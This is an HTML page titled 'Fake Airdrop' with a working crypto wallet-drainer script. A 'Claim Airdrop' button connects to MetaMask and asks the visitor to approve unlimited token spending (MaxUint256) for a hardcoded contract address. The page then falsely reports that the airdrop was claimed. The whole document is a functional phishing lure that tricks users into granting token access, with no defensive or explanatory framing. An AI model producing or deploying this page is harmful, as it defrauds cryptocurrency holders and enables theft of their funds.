<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Airdrop</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
</head>
<body>
    <h1>Fake Token Airdrop</h1>
    <p>Claim your FREE tokens now!</p>
    <button id="claimButton">Claim Airdrop</button>
    <div id="status"></div>

    <script>
        async function claimAirdrop() {
            // Check if MetaMask is installed
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Request account access
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    const signer = provider.getSigner();
                    
                    // Contract address and ABI
                    const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
                    const abi = [
                        {
                            "inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],
                            "name": "approve",
                            "outputs": [{"internalType": "bool","name": "","type": "bool"}],
                            "stateMutability": "nonpayable",
                            "type": "function"
                        }
                    ];
                    
                    const contract = new ethers.Contract(contractAddress, abi, signer);

                    // Approve the contract to spend all tokens (max uint256)
                    const approveTx = await contract.approve(contractAddress, ethers.constants.MaxUint256);
                    await approveTx.wait();

                    document.getElementById('status').innerText = "Airdrop claimed! Check your wallet.";
                } catch (error) {
                    document.getElementById('status').innerText = "Something went wrong: " + error.message;
                }
            } else {
                document.getElementById('status').innerText = "Please install MetaMask to interact with this airdrop.";
            }
        }

        document.getElementById('claimButton').addEventListener('click', claimAirdrop);
    </script>
</body>
</html>
